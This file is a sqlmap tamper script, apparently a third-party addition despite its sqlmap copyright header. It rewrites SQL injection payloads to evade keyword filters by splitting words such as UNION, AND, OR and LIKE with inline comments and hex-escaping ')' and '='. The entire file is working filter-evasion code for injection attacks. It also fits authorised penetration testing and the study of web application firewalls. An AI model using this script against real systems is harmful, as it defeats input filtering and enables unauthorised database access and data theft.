#!/usr/bin/env python

"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import re

from lib.core.enums import PRIORITY
from colorama import init
init(autoreset=False)


def printf(log, type=1):
    print(f'\033[3{type}m{log}\033[0m')


__priority__ = PRIORITY.LOWEST


class ithr_filters:
    def __init__(self, filter=['union']):
        self.filter = filter    # 关键词列表 AND => AN/* */D  OR -> O/* */R
        self.chars = r'\)|='    # 需要16进制编码的特殊字符
        self.match_filter = ''  # 正则sub匹配的关键词
        self.reload_filter()

    def reload_filter(self) -> None:
        self.match_filter = f'({"|".join(self.filter)})'

    def append(self, keyword) -> None:
        self.filter.append(keyword)
        self.reload_filter()

    def get_filter(self) -> str:
        return self.match_filter

    def annotation_escape(self, payload: re.Match):
        payload = payload[0]
        payload = f'{payload[0:-1]}/* */{payload[-1:]}'
        return payload


    def hex_escape(self,payload: re.Match):
        payload = payload[0]
        payload = r"""\x"""+payload.encode().hex()
        return payload

    def match(self, payload) -> str:
        payload_hex_escape = re.sub(self.chars, self.hex_escape, payload)
        payload_escape = re.sub(self.match_filter, self.annotation_escape, payload_hex_escape)
        return payload_escape


def dependencies():
    pass


filters = ithr_filters(filter=['union','and','AND','LIKE','UNION','OR','NOT'])


def tamper(payload, **kwargs):
    payload_escape = filters.match(payload)
    # payload_escape = payload_escape.replace('(', "")
    printf(f'[+][payload]: {payload} -> {payload_escape}[+]', 2)
    return payload_escape
